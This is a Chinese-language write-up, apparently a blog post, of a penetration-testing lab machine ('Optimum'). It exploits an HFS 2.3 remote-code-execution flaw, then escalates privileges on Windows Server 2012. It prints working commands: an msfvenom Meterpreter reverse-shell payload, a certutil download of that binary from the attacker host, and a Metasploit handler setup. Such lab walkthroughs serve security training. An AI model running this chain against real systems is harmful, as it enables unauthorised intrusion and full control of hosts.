#  从httpfileserver RCE漏洞到msf后渗透提权，靶机练习之optimum  
原创 wonderful
                    wonderful  百炼G33K   2026-11-03 07:19  
  
   
  
## 信息搜集  
  
```
nmap -sT --min-rate 10000 10.129.65.46 -p-

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WWFSJ8XciceClQIA3hOnaGMEbibqC18I83K9UkkG9SgE2hUdKJ3PPiad2c0RxNduzNXQgSemsJekrk4WxyRF5kYaP8xCdFfQGu6Cw/640?wx_fmt=png&from=appmsg "")  
> 只有一个80端口  
  
  
```
nmap -sT -sC -sV 10.129.65.46 -p80 -o ports 

```  
  
> 看一下版本  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WXswJWwTu6iaUNMYawPJTEr8F4A4G9Y4LzbAaqG40hWgjHGwAlR2lY3e4ce3XltQ6aeo941HJiaa4hOx4p5ftDVlicBKqQJrV2M2M/640?wx_fmt=png&from=appmsg "")  
> 是一个httpfileserver  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WU3ofLJozFVzUkTEXhico0mr6HnIq5CG40Cy49z2FbY5CEoBYNkPMHicse2wMLcicU5jaicUibKNFNKUyA0R5iajQD8RCJZfAib2Hwh24/640?wx_fmt=png&from=appmsg "")  
## hfs漏洞利用  
> 老版本的hfs应该是存在漏洞的  
  
  
```
searchsploit hfs 2.3

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WVvFJpzxQX9NFqj6trPy014Be29KZeh7zVxwz6eYaZfdA8bZg2ib0HlbBG83Tcb3fO4iaUP1HrrB1XmOYa6NvhGIz5TQicWoR3yBc/640?wx_fmt=png&from=appmsg "")  
  
```
search -m 49584

```  
  
> 选这个python的命令执行exp  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVcFngNSAClwVZyIrTkJBiceEGibt0v9gk6aKIWOoTsjQCcdiaAxDbfJJAvKTkZEBQhgqfBA8VKWzLo5ruZQOAGhJKrmZgCl0Xsic0/640?wx_fmt=png&from=appmsg "")  
> 开启nc接受反弹shell  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WXGzIS1h3vp1Sx6A0ibaiciclicZc5eEezQHD9GflGyqbJ9ibjhWODZ0ao92efszhwkGEFPBLWvLLvGu8aLKptHT823b3lROOUT694g/640?wx_fmt=png&from=appmsg "")  
> 成功反弹shell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVyFwtTojK9ajicC2ia7gwkM0hV8KJef0vwTm9RQicKrq5dVPeu1ibyLel5QDF7bFLA2tVgCJ0xa1uYMx0w1CSNaFw6c7kHjAl2gy4/640?wx_fmt=png&from=appmsg "")  
> 拿到第一个flag  
  
## 提权  
### 信息搜集  
  
```
systeminfo

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WWF93AuJoicxhskLhP90b3H6JtQDuwkBZPU70ITxZApZlDCdQ8ibahuWtbs9zyc6oXGf7okSZJbicqJFdSJyh8EZhEuuQL3pqQQT4/640?wx_fmt=png&from=appmsg "")  
> 为x64  windows server 2012  
  
  
```
whoami /all

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WV1xsl46icxMuGXDRGZyktnWsg9qAAvexIuMVEofKVrqW518AQXKL3jJtPP4EtwcotcvbypIzOpz0QmicSQSEniaaXDf4W7yrKvOM/640?wx_fmt=png&from=appmsg "")  
> 没有放开太多敏感权限  
  
### msf后渗透  
> 选择用msf后渗透，进一步搜集敏感信息  
  
  
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.15.182 lport=5555 -f exe -o shell.exe

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WUXMAUS9mwzpMwkPKrsN7Mvciaw91p2II8TvgMkeIsGyX4I2DAEnZkxW4VCibrEAqqsCtCQLeHTYqia63uia3OGibCNd2XCSkOPPBuI/640?wx_fmt=png&from=appmsg "")  
> kali开启文件服务，上传msf  
  
  
```
python -m http.server 80

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WWRv1U75ADuoXnWxGYTMqB5suQtB0nKbt2ItGzqa2bsjxQxFE4H6C3DeCL0bibt1LW3ym4oh8xmibkB2czkmAJ8qyiaC9cE1AJMtE/640?wx_fmt=png&from=appmsg "")  
  
```
certutil -urlcache -split -f http://10.10.15.182/shell.exe

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WXY2VfeJrGFslXmXK0C6qGYyW3ofWaVL6bYlb6TgMtLN9xStCopfMoOJZloCcDZk1cibxq14nM0jZrGtaDHksesBqYzbRBJCK6U/640?wx_fmt=png&from=appmsg "")  
> msf接收shell  
  
  
```
use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.182.15
set lport 5555
run

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WU1ibJDSApvoSVnQOK0fv9TGxX5cfPzfPQHPwvlIDHRuLEo8riaTlw4rbHYH9SkxBx0RtKOcOGZGGmIUhHVeoxn5yjpMh94LU83U/640?wx_fmt=png&from=appmsg "")  
### winpeas提权信息枚举  
> 上传winpeas  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVqfwQjND0UphhB2AuVic3YmYGJHmFGEUdZSh4FWrTJdiba8DqVqfA6rlYpZZahzPkNwQSh9ThJMoPEs0dUenAOF393nJl2BLK54/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WV1UqibxGXR4wGFK7SgZicKdLomx9m8dKHiaFkA0ticVf7spnffmHSP9ibicMqz69agM4NJQkg7CHbHu4NasBjSlRkpTekjM5VWOyAWE/640?wx_fmt=png&from=appmsg "")  
> 找到了一个密码  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUxpicLDn0VOvIN47c5Pon811QsWZEvicbCHZY8MfrZ0AkwTLC5q32JbzFVd56AuCGq45Nl2RQiaeAsDr4zwqwrmECsrdmqST6icTw/640?wx_fmt=png&from=appmsg "")  
### local_exploit_suggester提权  
> 使用suggester提权模块  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUCmpGHdz6ufAQPicjb7h6C2zu9xa71EJfwq2QcJ2GTB0o3ibDiavgom0yy0GniaY4SkZibu7HLeSWf4VS5I7PAc8kttyzsOKicWBQ0Y/640?wx_fmt=png&from=appmsg "")  
> 这边使用第9个payload  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUjSfBvrU4v0rAJlsgibBicictyYO8kPCTiaD153Kiboj9Boyslt2FGCe5FNc3KoWBSx3TiaufatCcuVdZydO7GQWAd23omgDJ6ax760/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WVQvmL0RNsYyjaKYBxopL1ibC4zEuTgyXt2SUr5JQ8kMtCexgWkuRZyib2BxLY0T9IouoK1ycmBuSXgLXpFZvxqpSGczc3ZBFG0s/640?wx_fmt=png&from=appmsg "")  
> 成功提权  
  
  
   
  
  
